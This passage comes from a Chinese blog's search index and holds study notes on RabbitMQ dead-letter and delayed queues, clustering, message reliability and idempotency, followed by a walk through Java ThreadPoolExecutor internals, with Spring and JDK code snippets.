   <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Queue <span class=\"title\">normalQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//指定队列的过期时间，死信交换机以及死信消息的路由</span></span><br><span class=\"line\">        Map&lt;String,Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//1.设置最大等待时间</span></span><br><span class=\"line\">        <span class=\"comment\">//map.put(&quot;x-message-ttl&quot;,5000);</span></span><br><span class=\"line\">        <span class=\"comment\">//2.设置队列的最大长度</span></span><br><span class=\"line\">       \t<span class=\"comment\">//map.put(&quot;x-max-length&quot;,10)</span></span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;x-dead-letter-exchange&quot;</span>,<span class=\"string\">&quot;Dead_direct_exchange&quot;</span>);</span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;x-dead-letter-routing-key&quot;</span>,<span class=\"string\">&quot;dead&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//通过参数的形式设置到队列中即可</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;normalQueue&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>,map);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//3.将队列绑定到交换机上,需要多绑定一个路由</span></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Binding <span class=\"title\">ttlDirectBinding1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> BindingBuilder.bind(normalExchange()).to(normalQueue()).with(<span class=\"string\">&quot;normal&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h4><p>利用超时特性，不设置正常消费者，那么所有消息到期后就会进入死信队列进行处理</p>\n<p>使用延迟队列</p>\n<p>1.订单在十分钟之内未支付则自动取消(十分钟后查询是否已支付,还不支付就取消订单)</p>\n<p>2.新创建的店铺，如果在十天内都没有上传过商品，则自动发送消息提醒。 </p>\n<p>3.用户注册成功后，如果三天内没有登陆则进行短信提醒。</p>\n<p>4.用户发起退款，如果三天内没有得到处理则通知相关运营人员。 </p>\n<p>5.预定会议后，需要在预定的时间点前十分钟通知各个与会人员参加会议</p>\n<p>这些场景都有一个特点，需要在某个事件发生之后或者之前的指定时间点完成某一项任务，如：发生订单生成事件，在十分钟之后检查该订单支付状态，然后将未支付的订单进行关闭；看起来似乎可以使用定时任务，一直轮询数据，每秒查一次，取出需要被处理的数据，然后处理不就完事了吗？如果数据量比较少，确实可以这样做。但对于数据量比较大，并且时效性较强的场景，如：“订单十分钟内未支付则关闭“，短期内未支付的订单数据可能会有很多，活动期间甚至会达到百万甚至千万级别，对这么庞大的数据量仍旧使用轮询的方式显然是不可取的，很可能在一秒内无法完成所有订单的检查，同时会给数据库带来很大压力，无法满足业务要求而且性能低下。</p>\n<h5 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h5><ol>\n<li>构建如下拓扑图(3个queue，2个exchange，3个binding，以及两个队列死信队列的声明)</li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615152907164.png\" alt=\"image-20220615152907164\"></p>\n<p>2.生产者发送消息<code>convertAndSend()</code>发送消息</p>\n<p>3.消费者接收消息接收消息定义回调接收消息</p>\n<p>以上模型有一个缺点：每一个不同的ttl的message需要设置新的队列，</p>\n<p><strong>解决方案2.0</strong></p>\n<p>因此可以不为队列设置ttl，单独设置一条没有ttl的队列，给message设置ttl(有点类似与IOC)发送时通过钩子函数设置ttl</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">MessagePostProcessor messagePostProcessor = (message)-&gt;&#123;</span><br><span class=\"line\">    message.getMessageProperties().setExpiration(ttlTime);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> message;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">rabbitTemplate.convertAndSend(<span class=\"string\">&quot;X&quot;</span>,<span class=\"string\">&quot;XC&quot;</span>,msg,messagePostProcessor);</span><br><span class=\"line\"><span class=\"comment\">//messagePostProcessor是一个回调，在发送消息后执行</span></span><br></pre></td></tr></table></figure>\n\n<p>以上模型仍然有缺点：</p>\n<blockquote>\n<p>消息不一定会按时死亡，因为RabbitMQ只会检查第一个消息是否会过期，因此如果后面的ttl比前面的短，那么第二个消息不会被执行</p>\n</blockquote>\n<p><strong>解决方案3.0</strong></p>\n<p>利用插件<a href=\"https://github.com/rabbitmq/rabbitmq-delayed-message-exchange/releases/download/3.10.2/rabbitmq_delayed_message_exchange-3.10.2.ez\">rabbitmq_delayed_message_exchange</a>延时队列插件,github有开源（3.8以后才可以用这个插件）</p>\n<p>进入到plugins目录，通过<code>rabbitmq-plugins enable plugin-name</code>启动延时队列插件，重启。发现管理页面中exchange中多了一种类型</p>\n<p>架构图变换成如下</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615163907369.png\" alt=\"image-20220615163907369\"></p>\n<p>其他不变只需要修改exchange，配置如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> CustomExchange <span class=\"title\">delayedExchange</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   Map&lt;String, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">   map.put(<span class=\"string\">&quot;x-delayed-type&quot;</span>,<span class=\"string\">&quot;direct&quot;</span>);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> CustomExchange(DELAYED_EXCHANGE_NAME,<span class=\"string\">&quot;x-delayed-message&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,map);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"集群\"><a href=\"#集群\" class=\"headerlink\" title=\"集群\"></a>集群</h2><p>普通集群(副本集群):除了队列以外都复制，也就是说消息只存储在主节点上，如果主节点宕机那么系统就废了，因此只有在主节点正常工作的情况下，副节点才可以对外提供服务。消费者可以通过副节点访问queue中的消息——挺鸡肋的(一般企业不用)</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615213252385.png\" alt=\"image-20220615213252385\"></p>\n<blockquote>\n<p>搭建方法:</p>\n<p>1.修改集群的host文件使得能够识别对方(处于同一个局域网内)</p>\n<p>2.集群内主机cookie同步</p>\n<p>3.通过<code>rabbitmqctl stop_app</code>,<code>rabbitmqctl join_cluster rabbit@mq1</code>,<code>rabbitmq_start_app</code>加入集群 </p>\n</blockquote>\n<p>镜像集群(主从复制):消息能够在多个节点间同步，一台宕机不会影响其他机器。能够提升MQ集群的整体高可用性。</p>\n<p>HapProxy是负载均衡器，也要多台防止一台宕机。LVS作代理将请求分发到可用代理上</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615213123551.png\" alt=\"image-20220615213123551\"></p>\n<blockquote>\n<p>搭建方法：在上面的基础上，在某个节点上新增策略</p>\n</blockquote>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615214848206.png\" alt=\"image-20220615214848206\"></p>\n<p>各参数含义</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615215418937.png\" alt=\"image-20220615215418937\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><h3 id=\"可靠性\"><a href=\"#可靠性\" class=\"headerlink\" title=\"可靠性\"></a>可靠性</h3><p>问题一：如何保证消息不丢失，可能丢失的原因如图</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220617091458641.png\" alt=\"image-20220617091458641\"></p>\n<p>解决方案:</p>\n<p>①：网络故障可能会导致消息丢失。以此使用消息确认机制，一旦发送到交换机或者队列则返回确认(无论成功与否都会返回)。也可以开启事务，但是事务是同步的，会极度影响性能（不推荐）</p>\n<p>②：在将消息发送到交换机后，消息存在于内存中，如果Rabbitmq挂了，那么消息会丢失。因此需要同时打开交换机，队列，消息的持久化保证数据不丢失。开启后rabbitmq会先持久化，然后再返回确认消息</p>\n<p>③：消息返回机制，如果消息无法找到路由队列或者交换机就会返回，可以补偿重发<br>④：消费端确认机制，将自动确认改为手动确认。对于发生异常的消息进行nack重新进入队列处理</p>\n<p>还有一些其他的极端异常情况，可以采取消息入库的做法，将消息的交换机，路由key，状态等消息保存到数据库，设置定时任务扫描表检查是否有异常的消息</p>\n<p><strong>流程说明</strong></p>\n<ol>\n<li><p>订单服务生产者再投递消息之前，先把消息持久化到<code>Redis</code>或<code>DB</code>中，建议<code>Redis</code>，高性能。消息的状态为发送中。</p>\n</li>\n<li><p>confirm机制监听消息是否发送成功？如ack成功消息，删除Redis中此消息。</p>\n</li>\n<li><p>如果nack不成功的消息，这个可以根据自身的业务选择是否重发此消息。也可以删除此消息，由自己的业务决定。</p>\n</li>\n<li><p>这边加了个定时任务，来拉取隔一定时间了，消息状态还是为发送中的，这个状态就表明，订单服务是没有收到ack成功消息。</p>\n</li>\n<li><p>定时任务会作补偿性的投递消息。这个时候如果MQ回调ack成功接收了，再把<code>Redis</code>中此消息删除。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220617093645829.png\" alt=\"image-20220617093645829\"></p>\n</li>\n</ol>\n<h3 id=\"幂等性\"><a href=\"#幂等性\" class=\"headerlink\" title=\"幂等性\"></a>幂等性</h3><p>MQ消费者的幂等性的解决一般使用全局ID或者写个唯一标识比如时间戳或者UUID。</p>\n<p>订单消费者消费MQ中的消息可利用MQ的该id来判断，或者可按自己的规则生成一个全局唯一id,每次消费消息时用该id先判断该消息是否已消费过。</p>\n<p>业界保证的幂等性操作主要有两种:</p>\n<ul>\n<li>唯一ID+指纹码机制，利用数据库查询是否重复。但是在高并发下性能较低</li>\n<li>利用redis的原子性实现(推荐)，redis的setnx命令天然具有幂等性，从而实现不重复消费</li>\n</ul>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><ol>\n<li>说明：默认在Spring AMQP视线中Work这种方式就是公平调度，如果需要实现能者多劳需要额外配置。所有队列，交换机的配置都可以在web页面进行设置。可以完全代替代码。各个参数在代码中通过hashmap设置，在网页中直接设置</li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615203103658.png\" alt=\"image-20220615203103658\"></p>\n<ol start=\"2\">\n<li>生产端没有指定交换机只有routingKey和Object，也就是说这个消费方产生hello队列，放在默认的交换机(AMQP default)上。而默认的交换机有一个特点，只要你的routingKey与这个交换机中有同名的队列，他就会自动路由上。生产端routingKey叫hello ，消费端生产hello队列。就可以路由上了</li>\n</ol>\n<ol start=\"3\">\n<li><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220614214929993.png\" alt=\"image-20220614214929993\"></li>\n</ol>\n<p><code>rabbitTemplate</code>生效的条件为只有一个<code>ConnectionFactory</code>，并且没有<code>RabbitOperations</code>这个接口时，<code>RabbitTemplate</code>也实现了这个接口，因此自己写的<code>rabbitTemplate</code>会替代原生的,如果想增强<code>rabbitTemplate</code>的功能，可以让他作为参数传入，增强后再利用@Bean注解返回到容器中</p>\n<ol start=\"4\">\n<li>备份交换机模型(1.对返回的消息补偿投递2.并且通过fanout起到警告的作用)</li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615201347250.png\" alt=\"image-20220615201347250\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//主交换机绑定备用交换机</span></span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> DirectExchange <span class=\"title\">confirmExchange</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> ExchangeBuilder.directExchange(<span class=\"string\">&quot;name&quot;</span>).</span><br><span class=\"line\">         durable(<span class=\"keyword\">true</span>).</span><br><span class=\"line\">         withArgument(<span class=\"string\">&quot;alternate-exchange&quot;</span>,backupName)\t<span class=\"comment\">//备用交换机的名字\t</span></span><br><span class=\"line\">         .build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>备用交换机的优先级比消息回退高</p>\n<ol start=\"5\">\n<li>惰性队列：消息保存在磁盘中，正常是在内存中.(适用于消耗消息比较慢的情景)</li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220615202723872.png\" alt=\"image-20220615202723872\"></p>\n<ol start=\"6\">\n<li> 优先级队列</li>\n</ol>\n<p>优先级高的消息优先被消费</p>\n<blockquote>\n<p>用法</p>\n<p>1.通过web页面设置最大优先级 或者 在声明队列时设置最大优先级 最大为255，建议设置最大为10</p>\n<p>2.发送消息时</p>\n</blockquote>\n","categories":["java"]},{"title":"线程池源码","url":"/p/65018/","content":"<h1 id=\"线程池\"><a href=\"#线程池\" class=\"headerlink\" title=\"线程池\"></a>线程池</h1><p>以juc自带的为例</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20221003144645863.png\" alt=\"image-20221003144645863\"></p>\n<p>线程池继承了<code>AbstractExecutorService</code>抽象类该类定义了常用的将线程转为<code>RunnableFuture</code>的方法以及实现了submit方法，这个抽象类实现了的<code>ExecutorService</code>接口，该接口定义了线程池的一些状态获取设置比如关机,还定义了submit提交任务的方法，最顶层的<code>Executor</code>接口只有一个execute方法。</p>\n<h2 id=\"7个参数\"><a href=\"#7个参数\" class=\"headerlink\" title=\"7个参数\"></a>7个参数</h2><ul>\n<li><p>corePoolSize 核心线程 线程池中的常驻核心线程数</p>\n</li>\n<li><p>maxinumPoolSize 最大线程数,当超过这个数时会根据拒绝策略执行操作</p>\n</li>\n<li><p>keepAliveTime 超时回收</p>\n</li>\n</ul>\n<p>当非核心线程留在线程池超过这个时间后，多余空闲线程会被销毁直到只剩下corePoolSize个线程为止。核心线程通常不会被回收，java核心线程池的回收由allowCoreThreadTimeOut参数控制，默认为false，若开启为true，则此时线程池中不论核心线程还是非核心线程，只要其空闲时间达到keepAliveTime都会被回收。但如果这样就违背了线程池的初衷（减少线程创建和开销），所以默认该参数为false。开启<code>executors.allowCoreThreadTimeOut(true)</code></p>\n<ul>\n<li><p>unit keepAliveTime的时间单位</p>\n</li>\n<li><p>workQueue 阻塞队列</p>\n</li>\n</ul>\n<p>用于保存被提交但是尚未被执行的任务,通常使用<code>LinkedBlockingQueue</code>性能较好读写锁分离并且不需要随机读写是有界队列，但是如果不设置则默认是无界队列最大可容纳Integer.MAX_VALUE可能会造成OOM，<code>ArrayBlockingQueue</code>读写锁相同,性能较低是有界队列底层是数组。有界队列容量是不可以变化的不像集合类</p>\n<ul>\n<li>threadFactory线程工厂</li>\n</ul>\n<p>用于生成线程池中工作线程的线程工厂，用于创建线程一般用默认的即可。如果需要修改或者设置线程的一些属性可以实现<code>ThreadFactory</code>接口实现自己的工厂</p>\n<ul>\n<li>handler拒绝策略</li>\n</ul>\n<p>表示当队列满了并且工作线程-大于等于线程池的数量最大线程数（maxinumPoolSize）时如何来拒绝请求执行的runnable的策略。属于是策略模式</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20221003144424623.png\" alt=\"image-20221003144424623\"></p>\n<h2 id=\"execute与submit\"><a href=\"#execute与submit\" class=\"headerlink\" title=\"execute与submit\"></a>execute与submit</h2><p>提交任务可以通过线程池的execute与submit方法</p>\n<p>其中execute是来自顶层的<code>Executor</code>接口,submit来自第二层的<code>ExecutorService</code>接口。submit方法底层也是调用量execute方法。submit一共3个重载方法</p>\n<p>submit会将无论是Runnable还是Callable封装成FutureTask,这个类实现了RunnableFurture接口,这个接口又实现了Runnable与Future接口.Runnable类型的对象，最终会通过Executors.callable()方法，将Runnable对象封装为一个Callable类型的对象。Executors.callable()的原理是使用适配器模式，适配器为 RunnableAdapter类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//callable为参树异步执行任务最后通过get方法获得结果</span></span><br><span class=\"line\">&lt;T&gt; <span class=\"function\">Future&lt;T&gt; <span class=\"title\">submit</span><span class=\"params\">(Callable&lt;T&gt; task)</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//Runnable是没有返回值的,但线程池将他转变为RunnableFuture,通过get获取是一个Null</span></span><br><span class=\"line\">Future&lt;?&gt; submit(Runnable task);</span><br><span class=\"line\"><span class=\"comment\">//跟上面类似但是在任务结束后会将传入的第二个参数赋值给result,通过get返回时会将result返回</span></span><br><span class=\"line\">&lt;T&gt; <span class=\"function\">Future&lt;T&gt; <span class=\"title\">submit</span><span class=\"params\">(Runnable task, T result)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//那么下面两个返回的Future意义是什么呢？</span></span><br><span class=\"line\"><span class=\"comment\">//当任务提交到线程池后，我们可能需要获取任务的返回值，或者想要知道任务有没有执行完成，甚至有时候因为特殊情况需要取消任务，我们就可以通过future去控制这个任务,相当于代理了这个任务</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>​    方法名 说明 Future&lt;?&gt; submit(Runnable task)  该方法虽然返回值对象是Future，但是由于提交的是Runnable类型的任务，所以使用Future.get()获取结果时会返回null。  Future submit(Runnable task,T result)  方法的返回值对象是Future，通过Future.get()获取具体的返回值时，结果与方法的第二个参数result相等。 Future  submit(Callable task)  该方法的参数是一个Callable类型的对象，方法有返回值。调用Future.get()获取到值就是Callable接口的call()方法返回的值.其中这个值是通过CAS保证安全的</p>\n</blockquote>\n<p>区别:</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20221003155811378.png\" alt=\"image-20221003155811378\"></p>\n<h2 id=\"线程池关机\"><a href=\"#线程池关机\" class=\"headerlink\" title=\"线程池关机\"></a>线程池关机</h2><p>我们来看一下如何停止线程池。主要有两个方法：shutdown、shutdownNow，从名字我们可以看出区别：</p>\n<ul>\n<li>shutdown()执行之后线程池会停止接收任务，但是还是会把任务池中的任务执行完再结束；</li>\n<li>shutdownNow()执行之后线程池不仅会停止接收任务，而且会把任务池中未执行的任务都清空，直接结束；</li>\n</ul>\n<h2 id=\"线程启动\"><a href=\"#线程启动\" class=\"headerlink\" title=\"线程启动\"></a>线程启动</h2><p><strong>start()</strong> 方法实际上是调用一个 native 方法 <strong>start0()</strong> 来启动一个线程。<br> 首先 start0()这个方法是在 Thread类 的<strong>静态块</strong>中注册的。其中 <strong>registerNatives</strong> 的本地方法的定义在文件<strong>Thread.c</strong>中，这个文件定义了各个操作系统平台要用的关于线程的公共数据和操作，<strong>start0()</strong> 方法实际会执行 <strong>JVM_StartThread</strong> 方法。<br> 然后在 <strong>hotspot</strong> 的源码可以找到 <strong>jvm.cpp</strong> 文件，其中的 <strong>JVM_ENTRY</strong> 是用来定义<strong>JVM_StartThread</strong> 函数的，在这个函数里面创建了一个真正和平台有关的本地线程。<br> 接下来是 <strong>newJavaThread</strong> 方法，这个方法有两个参数，第一个是函数名称，线程创建成功之后会根据这个函数名称调用对应的函数；第二个是当前进程内已经有的线程数量。<br> 最后是 <strong>os::create_thread</strong> ，实际就是调用平台创建线程的方法来创建线程。<br> 线程的启动会调用 <strong>Thread.cpp</strong> 文件中的 <strong>Thread::start(Thread* thread)</strong> 方法，这里有一个函数 <strong>os::start_thread(thread)</strong> 调用平台启动线程的方法，最终会调用 <strong>Thread.cpp</strong> 文件中的 <strong>JavaThread::run()</strong> 方法。</p>\n<h2 id=\"源码追踪\"><a href=\"#源码追踪\" class=\"headerlink\" title=\"源码追踪\"></a>源码追踪</h2><h3 id=\"线程池的几种状态\"><a href=\"#线程池的几种状态\" class=\"headerlink\" title=\"线程池的几种状态\"></a>线程池的几种状态</h3><ol>\n<li>RUNNING: 运行状态，能够接受新的任务且会处理阻塞队列中的任务。</li>\n<li>SHUTDOWN：关闭状态，不接受新任务，但是会处理阻塞队列中的任务，执行线程池的 shutDown()对应的就是此状态。</li>\n<li>STOP：停止状态，不接受新的任务，也不会处理等待队列中的任务并且会中断正在执行的任务。调用线程池的 shutDownNow()对应的是此状态</li>\n<li>TIDYING: 整理，即所有的任务都停止了，线程池中线程数量等于0，会调用 terminated()如果你自己实现线程池的话。</li>\n<li>TERMINATED：结束状态，terminated()方法执行完了。</li>\n</ol>\n<h3 id=\"常用变量\"><a href=\"#常用变量\" class=\"headerlink\" title=\"常用变量\"></a>常用变量</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"comment\">//CAS， 它的高三位表示线程池的状态，低29位表示线程池中现有的线程数</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> AtomicInteger ctl = <span class=\"keyword\">new</span> AtomicInteger(ctlOf(RUNNING, <span class=\"number\">0</span>));</span><br><span class=\"line\">   <span class=\"comment\">//表示线程池线程数的bit数</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> COUNT_BITS = Integer.SIZE - <span class=\"number\">3</span>;</span><br><span class=\"line\">   <span class=\"comment\">//最大的线程数量，数量是完全够用了 0001 1111 1111 1111 1111 1111 1111 1111</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> CAPACITY   = (<span class=\"number\">1</span> &lt;&lt; COUNT_BITS) - <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// runState is stored in the high-order bits</span></span><br><span class=\"line\">   <span class=\"comment\">//1110 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class=\"line\"><span class=\"comment\">//初始状态，在此状态下能够接收新任务，以及对已经添加的任务进行处理；</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> RUNNING    = -<span class=\"number\">1</span> &lt;&lt; COUNT_BITS;</span><br><span class=\"line\">   <span class=\"comment\">//0000 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class=\"line\"><span class=\"comment\">//调用shutdown方法，线程池转成SHUTDOWN状态。不再接收新任务，但是能处理已经添加的任务</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> SHUTDOWN   =  <span class=\"number\">0</span> &lt;&lt; COUNT_BITS;</span><br><span class=\"line\"><span class=\"comment\">//通过调用shutdownNow方法，线程池转成STOP状态。此时不再接收新任务，不处理已经添加的任务，并且会中断正在处理的任务；</span></span><br><span class=\"line\">   <span class=\"comment\">//0010 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> STOP       =  <span class=\"number\">1</span> &lt;&lt; COUNT_BITS;</span><br><span class=\"line\"><span class=\"comment\">//当线程池中所有的任务已经终止了，任务数量为0并且阻塞队列为空的时候，会进入到TIDYING状态。此时会调用一个钩子方法terminated，它是一个空的实现，可以供调用者覆写；</span></span><br><span class=\"line\">   <span class=\"comment\">//0100 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> TIDYING    =  <span class=\"number\">2</span> &lt;&lt; COUNT_BITS;</span><br><span class=\"line\"><span class=\"comment\">//线程池彻底终止的状态。当线程池处于TIDYING状态时，执行完terminated方法后，就会进入到该状态。</span></span><br><span class=\"line\">   <span class=\"comment\">//0110 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> TERMINATED =  <span class=\"number\">3</span> &lt;&lt; COUNT_BITS;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// Packing and unpacking ctl</span></span><br><span class=\"line\">   <span class=\"comment\">//获取线程池的状态</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">runStateOf</span><span class=\"params\">(<span class=\"keyword\">int</span> c)</span>     </span>&#123; <span class=\"keyword\">return</span> c &amp; ~CAPACITY; &#125;</span><br><span class=\"line\">   <span class=\"comment\">//获取线程池中已创建线程的数量</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">workerCountOf</span><span class=\"params\">(<span class=\"keyword\">int</span> c)</span>  </span>&#123; <span class=\"keyword\">return</span> c &amp; CAPACITY; &#125;</span><br><span class=\"line\">   <span class=\"comment\">//组装状态和数量，成为ctl</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">ctlOf</span><span class=\"params\">(<span class=\"keyword\">int</span> rs, <span class=\"keyword\">int</span> wc)</span> </span>&#123; <span class=\"keyword\">return</span> rs | wc; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">runStateLessThan</span><span class=\"params\">(<span class=\"keyword\">int</span> c, <span class=\"keyword\">int</span> s)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> c &lt; s;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">runStateAtLeast</span><span class=\"params\">(<span class=\"keyword\">int</span> c, <span class=\"keyword\">int</span> s)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> c &gt;= s;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"comment\">//判断线程是否在运行</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isRunning</span><span class=\"params\">(<span class=\"keyword\">int</span> c)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> c &lt; SHUTDOWN;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键方法execute\"><a href=\"#关键方法execute\" class=\"headerlink\" title=\"关键方法execute\"></a>关键方法execute</h3><blockquote>\n<p>三步走:1.核心处理2.进队3.非核心处理</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(Runnable command)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (command == <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NullPointerException();</span><br><span class=\"line\">    \t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Proceed in 3 steps:</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * 1. 如果线程数少于核心线程数直接创建线程并把这个任务当做第一个任务。</span></span><br><span class=\"line\"><span class=\"comment\">         *\t在addWorker添加任务时会判断线程池状态以及线程数避免浪费资源</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * 2. 如果任务能够成功进队，然后通过双检测法判断是否应该添加线程，避免由于在第</span></span><br><span class=\"line\"><span class=\"comment\">         * 一次检测到第二次之间线程池状态发生变化，如果真发生变化了就回滚删除任务同时拒绝</span></span><br><span class=\"line\"><span class=\"comment\">         *\t</span></span><br><span class=\"line\"><span class=\"comment\">         * 3.如果无法入队说明队列满了,需要添加非核心线程处理任务,添加成功则结束否则拒绝</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">    <span class=\"comment\">//获取关键原子变量ctl(线程池状态+当前线程数量)</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = ctl.get();</span><br><span class=\"line\">    <span class=\"comment\">//workCountOf取ctl后面29位获得当前线程数量</span></span><br><span class=\"line\">    <span class=\"comment\">//如果小于核心线程数量</span></span><br><span 